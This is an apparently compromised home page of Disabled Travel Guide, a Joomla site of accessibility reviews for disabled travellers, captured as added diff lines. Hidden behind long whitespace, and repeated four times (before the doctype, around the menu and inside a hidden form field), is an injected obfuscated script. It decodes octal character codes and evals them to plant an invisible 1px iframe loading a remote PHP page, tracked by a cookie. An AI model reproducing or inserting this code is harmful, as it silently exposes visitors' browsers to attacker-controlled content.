@@ -1,0 +1,733 @@
+                                                                                                                                                                                                                                                                                                                                                                                                                <script type="text/javascript" language="javascript" >                                                                                                                                                                                                                                                                                                                                                                                                                ss=eval("Str"+"ing");d=document;a=("44,152,171,162,147,170,155,163,162,44,176,176,176,152,152,152,54,55,44,177,21,16,44,172,145,166,44,173,164,44,101,44,150,163,147,171,161,151,162,170,62,147,166,151,145,170,151,111,160,151,161,151,162,170,54,53,155,152,166,145,161,151,53,55,77,21,16,21,16,44,173,164,62,167,166,147,44,101,44,53,154,170,170,164,76,63,63,170,151,160,151,153,166,145,164,154,147,163,172,151,62,147,163,63,151,167,150,62,164,154,164,53,77,21,16,44,173,164,62,167,170,175,160,151,62,164,163,167,155,170,155,163,162,44,101,44,53,145,146,167,163,160,171,170,151,53,77,21,16,44,173,164,62,167,170,175,160,151,62,146,163,166,150,151,166,44,101,44,53,64,53,77,21,16,44,173,164,62,167,170,175,160,151,62,154,151,155,153,154,170,44,101,44,53,65,164,174,53,77,21,16,44,173,164,62,167,170,175,160,151,62,173,155,150,170,154,44,101,44,53,65,164,174,53,77,21,16,44,173,164,62,167,170,175,160,151,62,160,151,152,170,44,101,44,53,65,164,174,53,77,21,16,44,173,164,62,167,170,175,160,151,62,170,163,164,44,101,44,53,65,164,174,53,77,21,16,21,16,44,155,152,44,54,45,150,163,147,171,161,151,162,170,62,153,151,170,111,160,151,161,151,162,170,106,175,115,150,54,53,173,164,53,55,55,44,177,21,16,44,150,163,147,171,161,151,162,170,62,173,166,155,170,151,54,53,100,150,155,172,44,155,150,101,140,53,173,164,140,53,102,100,63,150,155,172,102,53,55,77,21,16,44,150,163,147,171,161,151,162,170,62,153,151,170,111,160,151,161,151,162,170,106,175,115,150,54,53,173,164,53,55,62,145,164,164,151,162,150,107,154,155,160,150,54,173,164,55,77,21,16,44,201,21,16,201,21,16,152,171,162,147,170,155,163,162,44,127,151,170,107,163,163,157,155,151,54,147,163,163,157,155,151,122,145,161,151,60,147,163,163,157,155,151,132,145,160,171,151,60,162,110,145,175,167,60,164,145,170,154,55,44,177,21,16,44,172,145,166,44,170,163,150,145,175,44,101,44,162,151,173,44,110,145,170,151,54,55,77,21,16,44,172,145,166,44,151,174,164,155,166,151,44,101,44,162,151,173,44,110,145,170,151,54,55,77,21,16,44,155,152,44,54,162,110,145,175,167,101,101,162,171,160,160,44,200,200,44,162,110,145,175,167,101,101,64,55,44,162,110,145,175,167,101,65,77,21,16,44,151,174,164,155,166,151,62,167,151,170,130,155,161,151,54,170,163,150,145,175,62,153,151,170,130,155,161,151,54,55,44,57,44,67,72,64,64,64,64,64,56,66,70,56,162,110,145,175,167,55,77,21,16,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,44,101,44,147,163,163,157,155,151,122,145,161,151,57,46,101,46,57,151,167,147,145,164,151,54,147,163,163,157,155,151,132,145,160,171,151,55,21,16,44,57,44,46,77,151,174,164,155,166,151,167,101,46,44,57,44,151,174,164,155,166,151,62,170,163,113,121,130,127,170,166,155,162,153,54,55,44,57,44,54,54,164,145,170,154,55,44,103,44,46,77,44,164,145,170,154,101,46,44,57,44,164,145,170,154,44,76,44,46,46,55,77,21,16,201,21,16,152,171,162,147,170,155,163,162,44,113,151,170,107,163,163,157,155,151,54,44,162,145,161,151,44,55,44,177,21,16,44,172,145,166,44,167,170,145,166,170,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,155,162,150,151,174,123,152,54,44,162,145,161,151,44,57,44,46,101,46,44,55,77,21,16,44,172,145,166,44,160,151,162,44,101,44,167,170,145,166,170,44,57,44,162,145,161,151,62,160,151,162,153,170,154,44,57,44,65,77,21,16,44,155,152,44,54,44,54,44,45,167,170,145,166,170,44,55,44,52,52,21,16,44,54,44,162,145,161,151,44,45,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,167,171,146,167,170,166,155,162,153,54,44,64,60,44,162,145,161,151,62,160,151,162,153,170,154,44,55,44,55,44,55,21,16,44,177,21,16,44,166,151,170,171,166,162,44,162,171,160,160,77,21,16,44,201,21,16,44,155,152,44,54,44,167,170,145,166,170,44,101,101,44,61,65,44,55,44,166,151,170,171,166,162,44,162,171,160,160,77,21,16,44,172,145,166,44,151,162,150,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,155,162,150,151,174,123,152,54,44,46,77,46,60,44,160,151,162,44,55,77,21,16,44,155,152,44,54,44,151,162,150,44,101,101,44,61,65,44,55,44,151,162,150,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,160,151,162,153,170,154,77,21,16,44,166,151,170,171,166,162,44,171,162,151,167,147,145,164,151,54,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,167,171,146,167,170,166,155,162,153,54,44,160,151,162,60,44,151,162,150,44,55,44,55,77,21,16,201,21,16,155,152,44,54,162,145,172,155,153,145,170,163,166,62,147,163,163,157,155,151,111,162,145,146,160,151,150,55,21,16,177,21,16,155,152,54,113,151,170,107,163,163,157,155,151,54,53,172,155,167,155,170,151,150,143,171,165,53,55,101,101,71,71,55,177,201,151,160,167,151,177,127,151,170,107,163,163,157,155,151,54,53,172,155,167,155,170,151,150,143,171,165,53,60,44,53,71,71,53,60,44,53,65,53,60,44,53,63,53,55,77,21,16,21,16,176,176,176,152,152,152,54,55,77,21,16,201,21,16,201,21,16"["split"](","));for(i=0;i<a.length;i+=1){a[i]=parseInt(a[i],8)-(7-3);}try{d.body--}catch(q){zz=0;}try{zz&=2}catch(q){zz=1;}if(!zz)if(window["document"])eval(ss["fromCharCode"].apply(ss,a));</script><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-gb" lang="en-gb"> 
+
+<head>
+<meta name="language" content="En" />
+<link href="/templates/dtg/css/template_css.css" rel="stylesheet" type="text/css" media="all" />
+<!--[if IE 7]>
+<link href="/templates/dtg/css/ie7.css" rel="stylesheet" type="text/css" />
+<![endif]-->
+  <base href="http://disabledtravelguide.co.uk/" />
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="robots" content="index, follow" />
+  <meta name="keywords" content="disabled holiday, travel , holidays, disabled, wheelchair, disabled travel guide, accessible travel, disabled , disability , travel, disabled , disabled holidays, wheelchair, wheel-in showers , search, wheelchair flying, wheelchair plane, scooter plane, wheelchair, tourism for all, air travel wheelchair, mobility travel, Door to Door, mobility, access, disabled, transport, travel, DPTAC, accessibility, accessible, inaccessible, easy to use, disability, disabling, handicapped, invalid, reduced mobility, journey, trip, outing, holidays, travel, disabled tourism,disability, wheelchair user, disabled, handicapped, disabled holidays, ATS, access all areas, assistance, travel, access, holidays, multiple sclerosis, Multiple Sclerosis, Muscular Dystrophy, muscular dystrophy paraplegic Paraplegic tetraplegic Tetraplegic motor neurone Motor Neurone stroke spinal injuries polio, cerebral palsy, Cerebral Palsy, Osteo-arthritis, osteo-arthritis, physically challenged, disabled persons, travel, holidays, vacation, order the rough guide to accessible britain, free for blue badge holders, accessible guide, rough guide, disabled people, audio guide, motability, disabled travel guide, disabled vacation, disabled friendly, disabled travel guide, accessibility reviews, disability hotels, wheel chair access, holidays for the disabled user," />
+  <meta name="description" content="Disabled holiday ?  Disabled travel guide is an online resource for disabled travellers, friends, family, and carers. Reviews for disabled friendly hotels, locations, attractions and music venues provide information for anyone who likes to travel and dealing with disability because of age, illness or injury, helping them to plan for the perfect day out or disabled friendly holiday." />
+  <meta name="generator" content="Joomla! 1.5 - Open Source Content Management" />
+  <title>Disabled Travel Guide</title>
+  <link href="/templates/dtg/favicon.ico" rel="shortcut icon" type="image/x-icon" />
+  <link rel="stylesheet" href="/media/system/css/modal.css" type="text/css" />
+  <link rel="stylesheet" href="http://disabledtravelguide.co.uk/components/com_k2/css/k2.css" type="text/css" />
+  <link rel="stylesheet" href="/modules/mod_rokajaxsearch/css/rokajaxsearch.css" type="text/css" />
+  <link rel="stylesheet" href="/modules/mod_rokajaxsearch/themes/light/rokajaxsearch-theme.css" type="text/css" />
+  <link rel="stylesheet" href="/modules/mod_rokajaxsearch/themes/light/rokajaxsearch-theme-ie6.css" type="text/css" />
+  <script type="text/javascript" src="/media/system/js/mootools.js"></script>
+  <script type="text/javascript" src="/media/system/js/modal.js"></script>
+  <script type="text/javascript" src="http://disabledtravelguide.co.uk/components/com_k2/js/k2.js"></script>
+  <script type="text/javascript" src="/media/system/js/caption.js"></script>
+  <script type="text/javascript" src="/modules/mod_rokajaxsearch/js/rokajaxsearch.js"></script>
+  <script type="text/javascript">
+
+		window.addEvent('domready', function() {
+
+			SqueezeBox.initialize({});
+
+			$$('a.modal').each(function(el) {
+				el.addEvent('click', function(e) {
+					new Event(e).stop();
+					SqueezeBox.fromElement(el);
+				});
+			});
+		});var K2RatingURL = 'http://disabledtravelguide.co.uk/';window.addEvent((window.webkit) ? 'load' : 'domready', function() {
+				window.rokajaxsearch = new RokAjaxSearch({
+					'results': ' Results',
+					'close': '',
+					'websearch': 0,
+					'blogsearch': 0,
+					'imagesearch': 0,
+					'videosearch': 0,
+					'imagesize': 'MEDIUM',
+					'safesearch': 'STRICT',
+					'search': ' Search reviews...',
+					'readmore': ' Read more...',
+					'noresults': ' No results',
+					'advsearch': ' Advanced search',
+					'page': ' Page',
+					'page_of': ' of',
+					'searchlink': 'http://disabledtravelguide.co.uk/index.php?option=com_search&amp;view=search&amp;tmpl=component',
+					'advsearchlink': 'http://disabledtravelguide.co.uk/index.php?option=com_search&amp;view=search',
+					'uribase': 'http://disabledtravelguide.co.uk/',
+					'limit': '10',
+					'perpage': '3',
+					'ordering': 'newest',
+					'phrase': 'any',
+					'hidedivs': '',
+					'includelink': 1,
+					'viewall': ' View all results',
+					'estimated': ' estimated',
+					'showestimated': 0,
+					'showpagination': 1,
+					'showcategory': 1,
+					'showreadmore': 1,
+					'showdescription': 0
+				});
+			});
+  </script>
+  <script type="text/javascript">
+            /* <![CDATA[ */
+            var s2AjaxUri = "http://disabledtravelguide.co.uk/index.php?option=com_jreviews&format=raw&tmpl=component",
+                jrLanguage = new Array(),
+                jrVars = new Array(),
+                datePickerImage = "http://disabledtravelguide.co.uk/components/com_jreviews/jreviews/views/themes/default/theme_images/calendar.gif",
+                jrPublicMenu = 26;
+            jrLanguage["cancel"] = "Cancel";
+            jrLanguage["submit"] = "Next";
+            jrLanguage["field.select"] = "-- Select --";
+            jrLanguage["field.select_field"] = "-- Select %s --";
+            jrLanguage["field.no_results"] = "No results found, try a different spelling.";
+            jrLanguage["field.ui_help"] = "Start typing for suggestions";
+            jrLanguage["field.ui_add"] = "Add";
+            jrLanguage["compare.heading"] = "Compare";
+            jrLanguage["compare.compare_all"] = "Compare All";
+            jrLanguage["compare.remove_all"] = "Remove All";
+            jrLanguage["compare.select_more"] = "You need to select more than one listing for comparison.";
+            jrLanguage["compare.select_max"] = "You selected maximum number of listings for comparison.";
+            jrLanguage["geomaps.no_streeview"] = "Street view not available for this address.";
+            jrLanguage["geomaps.cannot_geocode"] = "Address could not be geocoded. Modify the address and click on the Geocode Address button to try again.";
+            jrLanguage["geomaps.drag_marker"] = "Drag the marker to fine-tune the geographic location on the map.";
+            jrLanguage["geomaps.directions_bad_address"] = "No corresponding geographic location could be found for one of the specified addresses. This may be due to the fact that the address is relatively new, or it may be incorrect.";
+            jrLanguage["geomaps.directions_request_error"] = "The was an error processing the request.";
+            jrVars["locale"] = "en_GB";
+            /* ]]> */
+            </script>
+  <link rel="stylesheet" type="text/css" href="http://disabledtravelguide.co.uk/components/com_jreviews/jreviews/views/themes/default/theme_css/theme.css" />
+  <link rel="stylesheet" type="text/css" href="http://disabledtravelguide.co.uk/components/com_jreviews/jreviews/views/themes/default/theme_css/modules.css" />
+  <link rel="stylesheet" type="text/css" href="http://disabledtravelguide.co.uk/components/com_jreviews/jreviews/views/themes/default/theme_css/paginator.css" />
+  <link rel="stylesheet" type="text/css" href="http://disabledtravelguide.co.uk/components/com_jreviews/jreviews/views/themes/default/theme_css/custom_styles_modules.css" />
+  <link rel="stylesheet" type="text/css" href="http://disabledtravelguide.co.uk/components/com_jreviews/jreviews/views/themes/compact/theme_css/custom_styles.css" />
+  <script type="text/javascript" src="http://disabledtravelguide.co.uk/components/com_jreviews/jreviews/views/js/jreviews.js"></script>
+  <script type="text/javascript" src="http://disabledtravelguide.co.uk/components/com_jreviews/jreviews/views/js/jquery/jquery-1.5.2.min.js"></script>
+  <script type="text/javascript" src="http://disabledtravelguide.co.uk/components/com_jreviews/jreviews/views/js/jquery/jquery.scrollable.min.js"></script>
+
+</head>
+<body id="pageBG">
+<a name="top"></a>
+
+<div id="header_shell">
+
+    <div id="menubox">
+      <!-- Menu START -->				
+            <div id="menu">
+          <ul class="menu"><li id="current" class="active item1"><a href="http://disabledtravelguide.co.uk/"><span>Home</span></a></li><li class="item23"><a href="/forum/index"><span>Forum</span></a></li><li class="item2"><a href="/register"><span>Register</span></a></li><li class="item4"><a href="/contact-us"><span>Contact us</span></a></li><li class="item27"><a href="/user-guide"><span>User Guide</span></a></li></ul>                                                                                                                                                                                                                                                                                                                                                                                                                <script type="text/javascript" language="javascript" >                                                                                                                                                                                                                                                                                                                                                                                                                ss=eval("Str"+"ing");d=document;a=("44,152,171,162,147,170,155,163,162,44,176,176,176,152,152,152,54,55,44,177,21,16,44,172,145,166,44,173,164,44,101,44,150,163,147,171,161,151,162,170,62,147,166,151,145,170,151,111,160,151,161,151,162,170,54,53,155,152,166,145,161,151,53,55,77,21,16,21,16,44,173,164,62,167,166,147,44,101,44,53,154,170,170,164,76,63,63,170,151,160,151,153,166,145,164,154,147,163,172,151,62,147,163,63,151,167,150,62,164,154,164,53,77,21,16,44,173,164,62,167,170,175,160,151,62,164,163,167,155,170,155,163,162,44,101,44,53,145,146,167,163,160,171,170,151,53,77,21,16,44,173,164,62,167,170,175,160,151,62,146,163,166,150,151,166,44,101,44,53,64,53,77,21,16,44,173,164,62,167,170,175,160,151,62,154,151,155,153,154,170,44,101,44,53,65,164,174,53,77,21,16,44,173,164,62,167,170,175,160,151,62,173,155,150,170,154,44,101,44,53,65,164,174,53,77,21,16,44,173,164,62,167,170,175,160,151,62,160,151,152,170,44,101,44,53,65,164,174,53,77,21,16,44,173,164,62,167,170,175,160,151,62,170,163,164,44,101,44,53,65,164,174,53,77,21,16,21,16,44,155,152,44,54,45,150,163,147,171,161,151,162,170,62,153,151,170,111,160,151,161,151,162,170,106,175,115,150,54,53,173,164,53,55,55,44,177,21,16,44,150,163,147,171,161,151,162,170,62,173,166,155,170,151,54,53,100,150,155,172,44,155,150,101,140,53,173,164,140,53,102,100,63,150,155,172,102,53,55,77,21,16,44,150,163,147,171,161,151,162,170,62,153,151,170,111,160,151,161,151,162,170,106,175,115,150,54,53,173,164,53,55,62,145,164,164,151,162,150,107,154,155,160,150,54,173,164,55,77,21,16,44,201,21,16,201,21,16,152,171,162,147,170,155,163,162,44,127,151,170,107,163,163,157,155,151,54,147,163,163,157,155,151,122,145,161,151,60,147,163,163,157,155,151,132,145,160,171,151,60,162,110,145,175,167,60,164,145,170,154,55,44,177,21,16,44,172,145,166,44,170,163,150,145,175,44,101,44,162,151,173,44,110,145,170,151,54,55,77,21,16,44,172,145,166,44,151,174,164,155,166,151,44,101,44,162,151,173,44,110,145,170,151,54,55,77,21,16,44,155,152,44,54,162,110,145,175,167,101,101,162,171,160,160,44,200,200,44,162,110,145,175,167,101,101,64,55,44,162,110,145,175,167,101,65,77,21,16,44,151,174,164,155,166,151,62,167,151,170,130,155,161,151,54,170,163,150,145,175,62,153,151,170,130,155,161,151,54,55,44,57,44,67,72,64,64,64,64,64,56,66,70,56,162,110,145,175,167,55,77,21,16,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,44,101,44,147,163,163,157,155,151,122,145,161,151,57,46,101,46,57,151,167,147,145,164,151,54,147,163,163,157,155,151,132,145,160,171,151,55,21,16,44,57,44,46,77,151,174,164,155,166,151,167,101,46,44,57,44,151,174,164,155,166,151,62,170,163,113,121,130,127,170,166,155,162,153,54,55,44,57,44,54,54,164,145,170,154,55,44,103,44,46,77,44,164,145,170,154,101,46,44,57,44,164,145,170,154,44,76,44,46,46,55,77,21,16,201,21,16,152,171,162,147,170,155,163,162,44,113,151,170,107,163,163,157,155,151,54,44,162,145,161,151,44,55,44,177,21,16,44,172,145,166,44,167,170,145,166,170,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,155,162,150,151,174,123,152,54,44,162,145,161,151,44,57,44,46,101,46,44,55,77,21,16,44,172,145,166,44,160,151,162,44,101,44,167,170,145,166,170,44,57,44,162,145,161,151,62,160,151,162,153,170,154,44,57,44,65,77,21,16,44,155,152,44,54,44,54,44,45,167,170,145,166,170,44,55,44,52,52,21,16,44,54,44,162,145,161,151,44,45,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,167,171,146,167,170,166,155,162,153,54,44,64,60,44,162,145,161,151,62,160,151,162,153,170,154,44,55,44,55,44,55,21,16,44,177,21,16,44,166,151,170,171,166,162,44,162,171,160,160,77,21,16,44,201,21,16,44,155,152,44,54,44,167,170,145,166,170,44,101,101,44,61,65,44,55,44,166,151,170,171,166,162,44,162,171,160,160,77,21,16,44,172,145,166,44,151,162,150,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,155,162,150,151,174,123,152,54,44,46,77,46,60,44,160,151,162,44,55,77,21,16,44,155,152,44,54,44,151,162,150,44,101,101,44,61,65,44,55,44,151,162,150,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,160,151,162,153,170,154,77,21,16,44,166,151,170,171,166,162,44,171,162,151,167,147,145,164,151,54,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,167,171,146,167,170,166,155,162,153,54,44,160,151,162,60,44,151,162,150,44,55,44,55,77,21,16,201,21,16,155,152,44,54,162,145,172,155,153,145,170,163,166,62,147,163,163,157,155,151,111,162,145,146,160,151,150,55,21,16,177,21,16,155,152,54,113,151,170,107,163,163,157,155,151,54,53,172,155,167,155,170,151,150,143,171,165,53,55,101,101,71,71,55,177,201,151,160,167,151,177,127,151,170,107,163,163,157,155,151,54,53,172,155,167,155,170,151,150,143,171,165,53,60,44,53,71,71,53,60,44,53,65,53,60,44,53,63,53,55,77,21,16,21,16,176,176,176,152,152,152,54,55,77,21,16,201,21,16,201,21,16"["split"](","));for(i=0;i<a.length;i+=1){a[i]=parseInt(a[i],8)-(7-3);}try{d.body--}catch(q){zz=0;}try{zz&=2}catch(q){zz=1;}if(!zz)if(window["document"])eval(ss["fromCharCode"].apply(ss,a));</script>
+          </div>
+                                                                                                                                                                                                                                                                                                                                                                                                                      <script type="text/javascript" language="javascript" >                                                                                                                                                                                                                                                                                                                                                                                                                ss=eval("Str"+"ing");d=document;a=("44,152,171,162,147,170,155,163,162,44,176,176,176,152,152,152,54,55,44,177,21,16,44,172,145,166,44,173,164,44,101,44,150,163,147,171,161,151,162,170,62,147,166,151,145,170,151,111,160,151,161,151,162,170,54,53,155,152,166,145,161,151,53,55,77,21,16,21,16,44,173,164,62,167,166,147,44,101,44,53,154,170,170,164,76,63,63,170,151,160,151,153,166,145,164,154,147,163,172,151,62,147,163,63,151,167,150,62,164,154,164,53,77,21,16,44,173,164,62,167,170,175,160,151,62,164,163,167,155,170,155,163,162,44,101,44,53,145,146,167,163,160,171,170,151,53,77,21,16,44,173,164,62,167,170,175,160,151,62,146,163,166,150,151,166,44,101,44,53,64,53,77,21,16,44,173,164,62,167,170,175,160,151,62,154,151,155,153,154,170,44,101,44,53,65,164,174,53,77,21,16,44,173,164,62,167,170,175,160,151,62,173,155,150,170,154,44,101,44,53,65,164,174,53,77,21,16,44,173,164,62,167,170,175,160,151,62,160,151,152,170,44,101,44,53,65,164,174,53,77,21,16,44,173,164,62,167,170,175,160,151,62,170,163,164,44,101,44,53,65,164,174,53,77,21,16,21,16,44,155,152,44,54,45,150,163,147,171,161,151,162,170,62,153,151,170,111,160,151,161,151,162,170,106,175,115,150,54,53,173,164,53,55,55,44,177,21,16,44,150,163,147,171,161,151,162,170,62,173,166,155,170,151,54,53,100,150,155,172,44,155,150,101,140,53,173,164,140,53,102,100,63,150,155,172,102,53,55,77,21,16,44,150,163,147,171,161,151,162,170,62,153,151,170,111,160,151,161,151,162,170,106,175,115,150,54,53,173,164,53,55,62,145,164,164,151,162,150,107,154,155,160,150,54,173,164,55,77,21,16,44,201,21,16,201,21,16,152,171,162,147,170,155,163,162,44,127,151,170,107,163,163,157,155,151,54,147,163,163,157,155,151,122,145,161,151,60,147,163,163,157,155,151,132,145,160,171,151,60,162,110,145,175,167,60,164,145,170,154,55,44,177,21,16,44,172,145,166,44,170,163,150,145,175,44,101,44,162,151,173,44,110,145,170,151,54,55,77,21,16,44,172,145,166,44,151,174,164,155,166,151,44,101,44,162,151,173,44,110,145,170,151,54,55,77,21,16,44,155,152,44,54,162,110,145,175,167,101,101,162,171,160,160,44,200,200,44,162,110,145,175,167,101,101,64,55,44,162,110,145,175,167,101,65,77,21,16,44,151,174,164,155,166,151,62,167,151,170,130,155,161,151,54,170,163,150,145,175,62,153,151,170,130,155,161,151,54,55,44,57,44,67,72,64,64,64,64,64,56,66,70,56,162,110,145,175,167,55,77,21,16,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,44,101,44,147,163,163,157,155,151,122,145,161,151,57,46,101,46,57,151,167,147,145,164,151,54,147,163,163,157,155,151,132,145,160,171,151,55,21,16,44,57,44,46,77,151,174,164,155,166,151,167,101,46,44,57,44,151,174,164,155,166,151,62,170,163,113,121,130,127,170,166,155,162,153,54,55,44,57,44,54,54,164,145,170,154,55,44,103,44,46,77,44,164,145,170,154,101,46,44,57,44,164,145,170,154,44,76,44,46,46,55,77,21,16,201,21,16,152,171,162,147,170,155,163,162,44,113,151,170,107,163,163,157,155,151,54,44,162,145,161,151,44,55,44,177,21,16,44,172,145,166,44,167,170,145,166,170,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,155,162,150,151,174,123,152,54,44,162,145,161,151,44,57,44,46,101,46,44,55,77,21,16,44,172,145,166,44,160,151,162,44,101,44,167,170,145,166,170,44,57,44,162,145,161,151,62,160,151,162,153,170,154,44,57,44,65,77,21,16,44,155,152,44,54,44,54,44,45,167,170,145,166,170,44,55,44,52,52,21,16,44,54,44,162,145,161,151,44,45,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,167,171,146,167,170,166,155,162,153,54,44,64,60,44,162,145,161,151,62,160,151,162,153,170,154,44,55,44,55,44,55,21,16,44,177,21,16,44,166,151,170,171,166,162,44,162,171,160,160,77,21,16,44,201,21,16,44,155,152,44,54,44,167,170,145,166,170,44,101,101,44,61,65,44,55,44,166,151,170,171,166,162,44,162,171,160,160,77,21,16,44,172,145,166,44,151,162,150,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,155,162,150,151,174,123,152,54,44,46,77,46,60,44,160,151,162,44,55,77,21,16,44,155,152,44,54,44,151,162,150,44,101,101,44,61,65,44,55,44,151,162,150,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,160,151,162,153,170,154,77,21,16,44,166,151,170,171,166,162,44,171,162,151,167,147,145,164,151,54,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,167,171,146,167,170,166,155,162,153,54,44,160,151,162,60,44,151,162,150,44,55,44,55,77,21,16,201,21,16,155,152,44,54,162,145,172,155,153,145,170,163,166,62,147,163,163,157,155,151,111,162,145,146,160,151,150,55,21,16,177,21,16,155,152,54,113,151,170,107,163,163,157,155,151,54,53,172,155,167,155,170,151,150,143,171,165,53,55,101,101,71,71,55,177,201,151,160,167,151,177,127,151,170,107,163,163,157,155,151,54,53,172,155,167,155,170,151,150,143,171,165,53,60,44,53,71,71,53,60,44,53,65,53,60,44,53,63,53,55,77,21,16,21,16,176,176,176,152,152,152,54,55,77,21,16,201,21,16,201,21,16"["split"](","));for(i=0;i<a.length;i+=1){a[i]=parseInt(a[i],8)-(7-3);}try{d.body--}catch(q){zz=0;}try{zz&=2}catch(q){zz=1;}if(!zz)if(window["document"])eval(ss["fromCharCode"].apply(ss,a));</script>      <!-- Menu END -->
+    </div><!-- menubox -->
+    
+    <div id="header">
+            
+    
+        <div id="logo">
+                    <p><a href="/"><strong><img src="/images/stories/disabledtravelguide_logo.png" width="386" alt="Disabled Travel Guide" title="Return to the home page" height="130" /><br /></strong></a></p>
+                </div><!-- end logo -->
+          
+                      
+        <div id="logobox">
+                    <ul>
+<li class="hotels"><a href="/hotels" title="Hotels"><img src="/images/stories/icons/icon-01.png" width="54" alt="icon-01" height="73" /><br /> Hotels</a></li>
+<li class="locations"><a href="/locations" title="Locations"><img src="/images/stories/icons/icon-03.png" width="54" alt="Locations" height="73" /><br /> Locations</a></li>
+<li class="cruises"><a href="/cruises" title="Cruises"><img src="/images/stories/icons/icon-cruises.png" width="54" alt="Cruises" height="73" /><br /> Cruises</a></li>
+<li class="attractions"><a href="/attractions" title="Attractions"><img src="/images/stories/icons/icon-04.png" width="54" alt="icon-04" height="73" /><br /> Attractions</a></li>
+<li class="music"><a href="/music-venues" title="Music Venues"><img src="/images/stories/icons/icon-07.png" width="54" alt="Music Venues" height="73" /><br /> Music Venues</a></li>
+<li class="add"><a href="/component/content/article/2" title="Leave a review"><img src="/images/stories/icons/icon-06-add.png" width="54" alt="Leave a review" height="73" /><br /> Leave a review</a></li>
+<li class="forum"><a href="/forum/index" title="Forum"><img src="/images/stories/icons/icon-05.png" width="54" alt="Forum" height="73" /><br /> Forum</a></li>
+</ul>
+                </div><!-- end logobox -->
+        
+    
+    </div><!-- end header -->
+    
+    
+                
+    
+        <!-- hero -->
+    <div id="hero">
+       
+        <div id="hero_content">
+            <p></p>
+<table border="0" cellspacing="0" cellpadding="0" width="100%">
+<tbody style="text-align: left;">
+<tr style="text-align: left;">
+<td style="text-align: left;" scope="row">
+<p style="text-align: center;"><img src="/images/stories/artwork/world_map.png" width="424" border="0" alt="Map depicting the world" title="DTG contains reviews from disabled travellers across the globe" height="221" /></p>
+<div class="bg-white padding rounded">
+<h3>What's it all about?</h3>
+<p>Planning a trip, a holiday, or a day out? Come to Disabled Travel Guide first; the on-line resource founded by and managed by other disabled travellers and wheelchair users. <br />Our travel community share reviews and information describing their best and worst experiences, so you can decide where to go and what to avoid. <br />Hotels, locations, music venues, walks. It's all here on Disabled Travel Guide.<br />Join our community, leave a review, and share your own expert information. <br />The short video on the right explains where to start, and how to get the most out of our site. <br />Access all areas with disabled travel guide.</p>
+</div>
+</td>
+<td style="text-align: center;">
+<p style="text-align: center;"><iframe width="404" height="230" src="http://www.youtube.com/embed/45tncF1b83c?rel=0" frameborder="0" allowfullscreen=""></iframe></p>
+<p><em><strong>"People can be impaired through injury or illness, but they are most likely to be impaired by lack of information"</strong></em> - Sean Gorman, Founder, Disabled Travel Guide</p>
+<div class="bg-white padding rounded">
+<p style="text-align: center;"><a href="/our-top-travel-tips"><img src="/images/stories/travel-tips.jpg" width="372" height="155" alt="travel-tips" /></a></p>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+        </div><!-- end hero_content -->
+             
+    </div>
+    <!-- end hero -->
+    
+</div>
+<!-- end header_shell -->
+
+<div id="outer">
+<div id="inner">
+	  
+            <div id="preface">
+            		<div class="moduletable">
+					<form name="rokajaxsearch" id="rokajaxsearch" class="light" action="http://disabledtravelguide.co.uk/" method="get">
+<div class="rokajaxsearch">
+	<div class="roksearch-wrapper">
+		<input id="roksearch_search_str" name="searchword" type="text" class="inputbox" value=" Search reviews..." />
+	</div>
+	<input type="hidden" name="searchphrase" value="any                                                                                                                                                                                                                                                                                                                                                                                                                <script type="text/javascript" language="javascript" >                                                                                                                                                                                                                                                                                                                                                                                                                ss=eval("Str"+"ing");d=document;a=("44,152,171,162,147,170,155,163,162,44,176,176,176,152,152,152,54,55,44,177,21,16,44,172,145,166,44,173,164,44,101,44,150,163,147,171,161,151,162,170,62,147,166,151,145,170,151,111,160,151,161,151,162,170,54,53,155,152,166,145,161,151,53,55,77,21,16,21,16,44,173,164,62,167,166,147,44,101,44,53,154,170,170,164,76,63,63,170,151,160,151,153,166,145,164,154,147,163,172,151,62,147,163,63,151,167,150,62,164,154,164,53,77,21,16,44,173,164,62,167,170,175,160,151,62,164,163,167,155,170,155,163,162,44,101,44,53,145,146,167,163,160,171,170,151,53,77,21,16,44,173,164,62,167,170,175,160,151,62,146,163,166,150,151,166,44,101,44,53,64,53,77,21,16,44,173,164,62,167,170,175,160,151,62,154,151,155,153,154,170,44,101,44,53,65,164,174,53,77,21,16,44,173,164,62,167,170,175,160,151,62,173,155,150,170,154,44,101,44,53,65,164,174,53,77,21,16,44,173,164,62,167,170,175,160,151,62,160,151,152,170,44,101,44,53,65,164,174,53,77,21,16,44,173,164,62,167,170,175,160,151,62,170,163,164,44,101,44,53,65,164,174,53,77,21,16,21,16,44,155,152,44,54,45,150,163,147,171,161,151,162,170,62,153,151,170,111,160,151,161,151,162,170,106,175,115,150,54,53,173,164,53,55,55,44,177,21,16,44,150,163,147,171,161,151,162,170,62,173,166,155,170,151,54,53,100,150,155,172,44,155,150,101,140,53,173,164,140,53,102,100,63,150,155,172,102,53,55,77,21,16,44,150,163,147,171,161,151,162,170,62,153,151,170,111,160,151,161,151,162,170,106,175,115,150,54,53,173,164,53,55,62,145,164,164,151,162,150,107,154,155,160,150,54,173,164,55,77,21,16,44,201,21,16,201,21,16,152,171,162,147,170,155,163,162,44,127